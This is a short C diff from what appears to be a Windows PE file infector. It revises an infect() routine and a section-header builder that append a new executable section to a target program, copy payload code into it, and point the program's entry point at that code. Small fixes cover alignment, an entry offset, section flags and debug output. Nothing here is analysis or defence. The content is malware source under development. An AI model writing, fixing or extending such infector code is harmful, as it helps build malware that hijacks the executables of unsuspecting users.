@@ -43,13 +43,14 @@ int infect(const char* filename, data_t* data) {
   //File will be altered after here
 
   ntHeaders->OptionalHeader.SizeOfCode += align_value(data->codeSize, ntHeaders->OptionalHeader.FileAlignment);
-  ntHeaders->OptionalHeader.SizeOfImage += extendedSize;
+  ntHeaders->OptionalHeader.SizeOfImage += align_value(data->codeSize, ntHeaders->OptionalHeader.SectionAlignment);
+  //ntHeaders->OptionalHeader.SizeOfHeaders = ? //TODO handle
 
   create_section_header(sectionHeader, ntHeaders, data);
 
   memcp(data->codeBegin, (uint8_t*)fileView.startAddress + sectionHeader->PointerToRawData, data->codeSize);
 
-  ntHeaders->OptionalHeader.AddressOfEntryPoint = sectionHeader->VirtualAddress;
+  ntHeaders->OptionalHeader.AddressOfEntryPoint = sectionHeader->VirtualAddress + data->entryOffset;
 
   data->functions.flushViewOfFile(fileView.startAddress, extendedSize);
   close_file_view(&fileView, data);
@@ -71,7 +72,12 @@ void create_section_header(IMAGE_SECTION_HEADER* sectionHeader, IMAGE_NT_HEADERS
   sectionHeader->VirtualAddress = (sectionHeader - 1)->VirtualAddress + align_value((sectionHeader - 1)->Misc.VirtualSize, ntHeaders->OptionalHeader.SectionAlignment);
   sectionHeader->SizeOfRawData = align_value(data->codeSize, ntHeaders->OptionalHeader.FileAlignment);
   sectionHeader->PointerToRawData = (sectionHeader - 1)->PointerToRawData + align_value((sectionHeader - 1)->SizeOfRawData, ntHeaders->OptionalHeader.FileAlignment);
-  sectionHeader->Characteristics = IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE;
+  sectionHeader->Characteristics = IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ;
+  PRINT_DEBUG("creating section:\n");
+  PRINT_DEBUG("\tvirtual size = 0x%Xl\n", (unsigned int)sectionHeader->Misc.VirtualSize);
+  PRINT_DEBUG("\tsize of raw data = 0x%X\n", (unsigned int)sectionHeader->SizeOfRawData);
+  PRINT_DEBUG("\tpointer to raw data = 0x%X\n", (unsigned int)sectionHeader->PointerToRawData);
+  PRINT_DEBUG("\tcharacteristics = 0x%X\n", (unsigned int)sectionHeader->Characteristics);
 }
 
 int open_file_view(const char* filename, file_view_t* fileView, data_t* data) {
